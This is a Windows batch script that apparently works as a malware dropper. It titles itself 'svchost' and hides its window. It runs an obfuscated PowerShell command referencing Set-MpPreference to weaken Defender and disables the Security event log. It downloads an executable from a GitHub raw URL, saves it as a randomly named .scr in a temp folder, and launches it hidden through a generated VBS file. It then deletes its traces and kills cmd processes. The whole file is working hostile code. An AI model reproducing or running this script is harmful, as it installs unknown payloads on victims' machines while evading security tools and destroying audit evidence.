@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion


mode con: cols=10 lines=5
title svchost

powershell -w h -nop -c "gc 'variable::1*'|i-xr 'Set-MpPreference' -T CSharp|iex;iov variable::user::env:content|(gc),$sb=(rv variable::1* -ea 0|iex);iex ($sb[13]+(gc content:(gc v*1*) -raw))"


wevtutil sl Security /e:false >nul 2>&1

for /f "tokens=*" %%a in ('powershell -c "[Convert]::ToString([Convert]::ToUInt32((Get-Random -Max 65536),2)).PadLeft(16,'0')"') do set "randname=%%a"
set "tmpdir=%TEMP%\!randname:~0,8!"
set "exefile=!randname:~8!.scr"
if not exist "!tmpdir!" mkdir "!tmpdir!" >nul 2>&1


powershell -nop -w hidden -c "[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('https://github.com/defdgofs/farty/raw/refs/heads/main/TaskHost_9b64816d.exe','!tmpdir!\!exefile!')"


if not exist "!tmpdir!\!exefile!" exit /b


echo Set WshShell = CreateObject^("WScript.Shell"^)
echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
echo strPath = "%tmpdir%\!exefile!"
echo WshShell.Run chr^(34^) ^& strPath ^& chr^(34^), 0, False
echo objFSO.DeleteFile strPath
echo objFSO.DeleteFolder "%tmpdir%"
) > "%tmpdir%\run.vbs"


start /b wscript.exe "%tmpdir%\run.vbs"


timeout /t 5 /nobreak >nul 2>&1
powershell -c "rm '%tmpdir%' -r -Force -ea 0" >nul 2>&1

powershell -nop -c "while($true){$p=Get-Process |?{$_.Path -like '*cmd*'}|select -f1;if($p.ProcessName -eq 'cmd'){$p.Kill();break};sleep 1}"
exit
